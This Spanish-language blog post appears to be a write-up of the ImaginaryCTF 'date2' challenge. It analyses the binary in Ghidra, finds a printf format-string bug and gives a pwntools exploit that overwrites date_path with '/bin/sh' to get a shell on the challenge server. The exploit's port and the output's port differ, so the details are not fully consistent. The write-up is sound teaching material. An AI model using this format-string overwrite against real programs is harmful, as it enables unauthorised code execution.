---
layout: post
title: ImaginaryCTF date2 - GOT overwrite
author: c4rta
date: 2022-07-30
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, GOT overwrite, format string]
image: /assets/img/imaginaryCTF-date2/waifu.jpg
---
En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir la direccion de GOT de printf
{:.lead}

## Analizando el binario con Ghidra

Este ejercicio es muy similar al enterior del post de GOT overwrite y para practicar esta perfecto, solo que ahora no podemos ver el codigo fuente del binario, asi que lo que nos toca es analizarlo con ghidra

Lo primero que vamos a hacer es meter el binario a Ghidra la cual pueden descargar desde su repo oficial

```
https://github.com/NationalSecurityAgency/ghidra/releases
```
Despues en la seccion llamada ```Symbool tree``` desplegaremos la carpeta de ```functions``` y le damos click en main, como se ve en la imagen

![](/assets/img/imaginaryCTF-date2/ghidra1.png)

Esto nos arrojara del lado derecho de ghidra el codigo que trato de decompilar donde vemos todo esto:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("What\'s today\'s date?");
  fgets(local_118,0x100,stdin);
  printf(local_118);
  puts("????");
  puts("no smh you are wrong the date is ");
  system(date_path);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Viendo la declaracion de variables en la parte de arriba, osea estas: 

```
long in_FS_OFFSET;
char local_118 [264];
long local_10;
```
Vemos una en particular que se declara como ```char local_118 [264];```, esto es el buffer asi que vamos a renombrar la variable ```local_118``` a ```buffer```, ahora nuestro codigo se ve asi:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  char buffer [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("What\'s today\'s date?");
  fgets(buffer,0x100,stdin);
  printf(buffer);
  puts("????");
  puts("no smh you are wrong the date is ");
  system(date_path);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Acortanto mas el codigo para mostrar lo que nos interesa queda el codigo asi:

```c
  puts("What\'s today\'s date?");
  fgets(buffer,0x100,stdin);
  printf(buffer);
  puts("????");
  puts("no smh you are wrong the date is ");
  system(date_path);
```
Esto es sencillo de analizar lo que hace el binario es primeramente con ```puts``` mostrar el mensaje de ```What\'s today\'s date?```, despues con ```fgets(buffer,0x100,stdin);``` recibe un input que se guardara en ```buffer``` donde el valor maximo que podemos guardar es ```0x100```, esto pasandolo de hexadecimal a decimal nos da ```256```, despues hay dos ```puts``` que imprimen unas cadenas (nada relevante), y finalmente la funcion ```system``` manda a llamar a lo que tiene ```date_path```, y si en Ghidra le damos doble click sobre ```date_path``` vemos lo siguiente

![](/assets/img/imaginaryCTF-date2/ghidra2.png)

Aqui ya esta potente la cosa, por que se esta mandando a llamar al binario ```date``` desde la funcion ```system``` y se sabe que se esta llamando el binario date ya que la ruta es ```/usr/bin/date```, asi que lo que vamos a hacer es sobreescribir el valor GOT de ```date_path``` por ```/bin/sh``` y como se esta usando la funcion ```system``` nos debe de ejecutar una sh  

### Calculando el offset el buffer

De igual manera que el ejercicio anterior de GOT tenemos de encontrar el offset del buffer a travez de format string, asi que le pasaremos el binario algunas A y algunos format string ```AAAAAAAA %p %p %p %p %p %p %p %p```, cuando lo ejecutemos nos muestra esto

![](/assets/img/imaginaryCTF-date2/vuln1.png)

Si empezamos a contar desde ```0x7ffff7dfda63``` hasta donde empiezan nuestras "A" que es donde esta seleccionado en la imagen nos da como resultado 6, asi que ese es el offset el buffer

## Ejecutando el exploit

EL exploit usado es similar al del post anterior de GOT, lo que cambia es que nos estamos conectando remotamente a eth007.me.

```python

from pwn import *

context.binary = elf = ELF("./vuln")
r = remote("eth007.me", 42042)
r.sendline(fmtstr_payload(6, writes={elf.sym.date_path: u64(b"/bin/sh\x00")}))
r.interactive()
```
Si lo ejecutamos y listamos el contenido podemos ver la flag

```
[+] Opening connection to eth007.me on port 42069: Done
[*] '/home/omarh/Escritorio/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
no smh you are wrong the date is 
$ ls
flag.txt
```
Eso ha sido todo, gracias por leer ❤